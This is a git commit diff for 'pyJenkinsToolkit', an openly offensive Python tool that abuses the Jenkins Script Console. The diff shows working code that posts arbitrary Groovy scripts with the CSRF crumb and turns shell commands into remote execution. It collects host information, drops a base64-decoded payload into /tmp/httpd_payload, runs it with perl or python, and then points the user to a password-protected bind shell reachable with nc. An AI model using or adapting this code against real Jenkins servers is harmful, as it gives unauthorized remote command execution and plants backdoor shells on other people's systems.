ee112004b31a6178df7558a3260cc8ef77db9098
n0ix <n0ix@protonmail.com>
2016-10-27 21:24:28 +0200

    Init

--- pyJenkinsToolkit/pyJenkinsToolkit.py
+++ pyJenkinsToolkit/pyJenkinsToolkit.py
@@ -10,9 +10,89 @@ from colorama import init
 from colorama import Fore, Back, Style
 from bs4 import BeautifulSoup
 
+def SendGroovyScriptScript(url,crumb,groovyscript):
+    "Sends any Groovy Script to the given Jenskins Host via ScripConsole"
+
+    scriptresult=None
+
+    try:
+        
+        headers = {
+
+        'UserAgent':'Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0',
+        'ContentType':'application/x-www-form-urlencoded',
+        'Method':'POST'
+        }
+        
+        if not crumb==None:
+            crumbkey=crumb.split(':')[0]
+            crumbvalue=crumb.split(':')[1]
+            
+            data = {
+                'script': groovyscript,
+                'Submit': 'Run',
+                crumbkey:crumbvalue
+            }
+        else:
+            data = {
+                'script': groovyscript,
+                'Submit': 'Run'
+        }
+            
+            
+        data = urllib.urlencode(data)
+        
+        if args.verbose:
+            print "Sending Payload to Jenkins Host {0}".format(url)
+            print
+
+        req = urllib2.Request(url, data,headers)
+        response = urllib2.urlopen(req, timeout=10)
+        the_page = response.read()
+
+        soup=BeautifulSoup(the_page,'html.parser')
+
+        scriptresult = str(soup.find_all('pre')[1]).replace("<pre>","")
+        scriptresult = scriptresult.replace("</pre>","")
+
+        if args.verbose:
+            print scriptresult
+
+    except urllib2.HTTPError as err:
+         print(Fore.RED + err.reason)
+         result=False
+    except:
+        result=False
+        print(Fore.RED + "Oops - Error Sending GroovyScript to Jenkins Host {0}".format(url))
+        print("Unexpected error:", sys.exc_info()[0])
+        print(Style.RESET_ALL)
+
+    return scriptresult
+
+def ConvertShell2GroovyScript(script,waitforexit=True):
+    "Converts a Shell Command/Script into GroovyScript"
+    
+    groovy_script="def sout = new StringBuffer(), serr = new StringBuffer()\n"
+    
+    script_command_counter=0
+    
+    for line in script.splitlines():   
+           
+        groovy_script +='def proc{0} = """{1}""".execute()\n'.format(script_command_counter,line)
+
+        if waitforexit==True:
+            groovy_script +='proc{0}.consumeProcessOutput(sout, serr)\n'.format(script_command_counter)
+            groovy_script +='proc{0}.waitForOrKill(1000)\n'.format(script_command_counter)
+
+        script_command_counter+=1
+           
+    groovy_script += 'println "$sout"'
+
+    return groovy_script
+
 def GetJenkinsCrumb(url):
 
-    crumb="nothing"
+    crumb=None
 
     try:
 
@@ -27,189 +107,25 @@ def GetJenkinsCrumb(url):
 
     return crumb
 
-def SendShellPayload(url,crumb,payload):
-    "This Sends the base64 Encoded Payload"
+def GenerateGroovyLinuxPayload(payload):
+    "Generates the GroovyScript Shell Payload for Linux Systems"
 
-    result=True
+    payload_script="def sout = new StringBuffer(), serr = new StringBuffer()\n"
+    payload_script='def encoded = "{0}"\n'.format(payload)
+    payload_script +='byte[] decoded = encoded.decodeBase64()\n'
+    payload_script +='def s = new String(decoded)\n'
+    payload_script +='new File("/tmp/","httpd_payload").withWriter{ it << s }\n'
 
-    full_script="def sout = new StringBuffer(), serr = new StringBuffer()\n"
-    full_script='def encoded = "{0}"\n'.format(payload)
-    full_script +='byte[] decoded = encoded.decodeBase64()\n'
-    full_script +='def s = new String(decoded)\n'
-    full_script +='new File("/tmp/","httpd_payload").withWriter{ it << s }\n'
+    payload_script +='def proc{0} = """{1}""".execute()\n'.format(0,'chmod +x /tmp/httpd_payload')
+    payload_script +='proc{0}.consumeProcessOutput(sout, serr)\n'.format(0)
+    payload_script +='proc{0}.waitForOrKill(1000)\n'.format(0)
 
-    full_script +='def proc{0} = """{1}""".execute()\n'.format(0,'chmod +x /tmp/httpd_payload')
-    full_script +='proc{0}.consumeProcessOutput(sout, serr)\n'.format(0)
-    full_script +='proc{0}.waitForOrKill(1000)\n'.format(0)
+    return payload_script
 
-    headers = {
-
-        'UserAgent':'Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0',
-        'ContentType':'application/x-www-form-urlencoded',
-        'Method':'POST'
-}
-
-    if not crumb=="nothing":
-
-        crumbkey=crumb.split(':')[0]
-        crumbvalue=crumb.split(':')[1]
-
-        data = {
-            'script': full_script,
-            'Submit': 'Run',
-            crumbkey:crumbvalue
-        }
-    else:
-        data = {
-            'script': full_script,
-            'Submit': 'Run'
-        }
-
-    data =  urllib.urlencode(data)
-
-    if args.verbose:
-        print "Sending Payload to Jenkins Host {0}".format(url)
-        print
-    try:
-
-        req = urllib2.Request(url, data,headers)
-        response = urllib2.urlopen(req, timeout=10)
-        the_page = response.read()
-
-    except urllib2.HTTPError as err:
-         print(Fore.RED + err.reason)
-         result=False
-    except:
-        result=False
-        print(Fore.RED + "Oops - Error Sending Payload to Jenkins Host {0}".format(url))
-        print("Unexpected error:", sys.exc_info()[0])
-        print(Style.RESET_ALL)
-
-    return result
-
-def ExecuteJenkinsScript(url,crumb, script):
-    "This excutes a jenkins script on a specific site"
-
-    script = str(script)
-    scriptresult="nothing"
-    full_script="def sout = new StringBuffer(), serr = new StringBuffer()\n"
-    script_command_counter=0
-
-    for line in script.splitlines():   
-           
-        full_script +='def proc{0} = """{1}""".execute()\n'.format(script_command_counter,line)
-        full_script +='proc{0}.consumeProcessOutput(sout, serr)\n'.format(script_command_counter)
-        full_script +='proc{0}.waitForOrKill(1000)\n'.format(script_command_counter)
-        script_command_counter+=1
-           
-    full_script += 'println "$sout"'
-              
-    headers = {
-
-        'UserAgent':'Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0',
-        'ContentType':'application/x-www-form-urlencoded',
-        'Method':'POST'
-}
-
-    if not crumb=="nothing":
-
-        crumbkey=crumb.split(':')[0]
-        crumbvalue=crumb.split(':')[1]
-
-        data = {
-            'script': full_script,
-            'Submit': 'Run',
-            crumbkey:crumbvalue
-        }
-    else:
-        data = {
-            'script': full_script,
-            'Submit': 'Run'
-        }
-
-    data =  urllib.urlencode(data)
-
-    if args.verbose:
-        print "Sending Script to Jenkins Host {0}".format(url)
-        print
-
-    try:
-
-        req = urllib2.Request(url, data,headers)
-        response = urllib2.urlopen(req, timeout=10)
-        the_page = response.read()
-
-        soup=BeautifulSoup(the_page,'html.parser')
-
-        scriptresult = str(soup.find_all('pre')[1]).replace("<pre>","")
-        scriptresult = scriptresult.replace("</pre>","")
-
-        if args.verbose:
-            print scriptresult
-
-
-    except urllib2.HTTPError as err:
-         print(Fore.RED + err.reason)
-    except:
-        print(Fore.RED + "Oops - Jenkins Host {0} not reachable".format(url))
-        print("Unexpected error:", sys.exc_info()[0])
-        print(Style.RESET_ALL)
-
-    return scriptresult.strip()
-
-def ExecuteShellPayload(url,crumb,payload_type,payload_param):
-
-    result=True 
-    full_script ='def proc = """{0} {1}""".execute()\n'.format(payload_type,'/tmp/httpd_payload')
-
-    headers = {
-
-        'UserAgent':'Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0',
-        'ContentType':'application/x-www-form-urlencoded',
-        'Method':'POST'
-}
-
-    if not crumb=="nothing":
-
-        crumbkey=crumb.split(':')[0]
-        crumbvalue=crumb.split(':')[1]
-
-        data = {
-            'script': full_script,
-            'Submit': 'Run',
-            crumbkey:crumbvalue
-        }
-    else:
-        data = {
-            'script': full_script,
-            'Submit': 'Run'
-        }
-
-    data =  urllib.urlencode(data)
-
-    if args.verbose:
-        print "Executing Payload on Jenkins Host {0}".format(url)
-        print
-    try:
-
-        req = urllib2.Request(url, data,headers)
-        response = urllib2.urlopen(req, timeout=10)
-        the_page = response.read()
-
-    except urllib2.HTTPError as err:
-         print(Fore.RED + err.reason)
-         result=False
-    except:
-        result=False
-        print(Fore.RED + "Oops - Error starting Payload on Jenkins Host {0}".format(url))
-        print("Unexpected error:", sys.exc_info()[0])
-        print(Style.RESET_ALL)
-
-    return result
 
 def GetJenkinsSystemType(url,crumb):
 
-      result=ExecuteJenkinsScript(url,crumb,'wmic os get Caption /value')
+      result=SendGroovyScriptScript(url,crumb,ConvertShell2GroovyScript('wmic os get Caption /value'))
 
       if not result.find('Windows')==-1:
           return "windows"
@@ -235,7 +151,7 @@ parser = argparse.ArgumentParser(description='Jenkins Toolkit')
 
 parser.add_argument('-u','--url', nargs='+', help='<Required> One or more Jenkins Urls to process. You can also specifiy a text file with the urls in it', required=True, type=str)
 parser.add_argument("-m", "--mode", type=str, choices=['info','shell'], help='<Required> Specifies the Toolkit Mode')
-parser.add_argument('-o','--output', help='<Optional> File where the output is written (Only if Mode = Info)', type=str, default="none")
+parser.add_argument('-o','--output', help='<Optional> File where the output is written (Only if Mode = Info)', type=str, default=None)
 parser.add_argument('-spw','--shellpassword', help='<Optional> Password for Shell', type=str, default='none')
 parser.add_argument('-sp','--shellport', help='<Required (Mode Shell)> Port Bind Shell', type=int, default=0)
 parser.add_argument("-st", "--shelltype", type=str, choices=['perl','python'], help='<Optional (Mode Shell)> Specifies Shell Script Type - Default:"perl"', default="perl")
@@ -357,7 +273,7 @@ for jenkinsurl in url_list:
     crumb=GetJenkinsCrumb(jenkinsurl)
 
     if args.verbose:
-        if not crumb=="nothing":
+        if not crumb==None:
             print(Fore.GREEN + "Successfull grepped Jenkins Crumb")
             print(Style.RESET_ALL)
         else:
@@ -375,22 +291,24 @@ for jenkinsurl in url_list:
 
     if args.mode == 'info':
 
-        if system_type == "windows":
-            result=ExecuteJenkinsScript(jenkinsurl,crumb,info_script_windows)
+        if system_type == "windows":      
+            result=SendGroovyScriptScript(jenkinsurl,crumb,ConvertShell2GroovyScript(info_script_windows,True))
         else:
-            result=ExecuteJenkinsScript(jenkinsurl,crumb,info_script_linux)
-        
-        if not result=="nothing":
+            result=SendGroovyScriptScript(jenkinsurl,crumb,ConvertShell2GroovyScript(info_script_linux,True))
+       
+        if not result==None:
           print(Fore.GREEN + "{0} successfull analyzed".format(jenkinsurl))
           print(Style.RESET_ALL)
 
-          if not args.output=="none":
+          if not args.output==None:
               WriteJenkinsInfo(jenkinsurl,result,args.output)
+          else:
+               print result
         else:
           print(Fore.RED + "{0} failed!".format(jenkinsurl))
           print(Style.RESET_ALL)
 
-          if not args.output=="none":
+          if not args.output==None:
               WriteJenkinsInfo(jenkinsurl,"{0} failed!".format(jenkinsurl),args.output)
           
     if args.mode == 'shell':
@@ -401,9 +319,11 @@ for jenkinsurl in url_list:
             print(Fore.YELLOW + "Sorry...not yet implemented")
 
         else:
-            payload_result=SendShellPayload(jenkinsurl,crumb,shell_script_linux)
+
+            payload_result=SendGroovyScriptScript(url,crumb,GenerateGroovyLinuxPayload(shell_script_linux))
+            
             if payload_result:
-                payload_result=ExecuteShellPayload(jenkinsurl,crumb,args.shelltype,"")
+                payload_result=SendGroovyScriptScript(url,crumb,ConvertShell2GroovyScript("{0} /tmp/httpd_payload".format(args.shelltype),False))
                 if payload_result:
                     print(Fore.GREEN + "Shell successfully deployed on Host {0}".format(jenkinsurl))
                     print("Connect to Shell manual via: nc {0} {1} with Password {2}".format(urlparse.hostname,args.shellport,args.shellpassword))
